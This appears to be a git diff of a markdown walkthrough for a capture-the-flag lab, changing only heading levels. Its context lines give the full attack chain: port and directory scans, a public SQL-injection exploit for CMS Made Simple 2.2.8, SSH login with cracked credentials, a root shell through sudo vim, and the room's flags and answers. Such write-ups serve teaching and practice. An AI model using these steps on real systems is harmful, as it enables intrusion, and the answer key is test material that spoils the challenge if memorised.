@@ -25,7 +25,7 @@ We can see here is 2 ports are running under port 1000
 2
 ```
 
-# 2. What is running on the higher port?
+## 2. What is running on the higher port?
 
 To find that we can perform simple nmap scans 
 - `nmap TARGET-IP`
@@ -39,7 +39,7 @@ We can see ssh are running
 SSH
 ```
 
-# 3. What's the CVE you're using against the application?
+## 3. What's the CVE you're using against the application?
 
 I discovered a hidden directory with - `gobuster`
 - `gobuster dir -u http://10.201.44.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10`
@@ -59,7 +59,7 @@ You can see that i found in the buttom - `CMS Made Simple version 2.2.8` then i 
 CVE-2019-9053
 ```
 
-# 4. To what kind of vulnerability is the application vulnerable?
+## 4. To what kind of vulnerability is the application vulnerable?
 
 We can see in exploit.db page on top that it can vulnerable with - `sql injection`
 
@@ -67,7 +67,7 @@ We can see in exploit.db page on top that it can vulnerable with - `sql injectio
 SQLI
 ```
 
-# 5. What's the password?
+## 5. What's the password?
 
 You can see in exploit.db we have EDB-ID - `46635`
 now we have to save this exploit in over attacker machine to save this use this command - `searchsploit -m 46635`
@@ -85,7 +85,7 @@ After running that command it take's time to find username, password and email (
 secret
 ```
 
-# 6. Where can you login with the details obtained?
+## 6. Where can you login with the details obtained?
 
 now you have user name and password use it for SSH
 - `ssh mitch@TARGET-IP`
@@ -95,7 +95,7 @@ Enter the password - `secret`
 SSh
 ```
 
-# 7. What's the user flag?
+## 7. What's the user flag?
 
 you can find a file - `user.txt` open it with - `cat` 
 
@@ -103,7 +103,7 @@ you can find a file - `user.txt` open it with - `cat`
 G00d j0b, keep up!
 ```
 
-# 8. Is there any other user in the home directory? What's its name?
+## 8. Is there any other user in the home directory? What's its name?
 
 To find other user go to home directory - `cd /home`
 Then you can see other user 
@@ -112,7 +112,7 @@ Then you can see other user
 sunbath
 ```
 
-# 9. What can you leverage to spawn a privileged shell?
+## 9. What can you leverage to spawn a privileged shell?
 
 we can use vim to privilage shell i found this command on 'https://gtfobins.github.io/gtfobins/vim/'
 - `sudo vim -c ':!/bin/sh'`
@@ -123,7 +123,7 @@ we can use vim to privilage shell i found this command on 'https://gtfobins.gith
 vim
 ```
 
-# 10. What's the root flag?
+## 10. What's the root flag?
 
 I discovered that user mitch can run /usr/bin/vim as root without a password (- `sudo -l showed NOPASSWD: /usr/bin/vim`). I abused this by spawning a root shell with - `sudo vim -c ':!/bin/sh'`, which dropped me to a root shell (uid=0). From there I changed to /root and read the flag file: -`cat /root/root.txt`
 
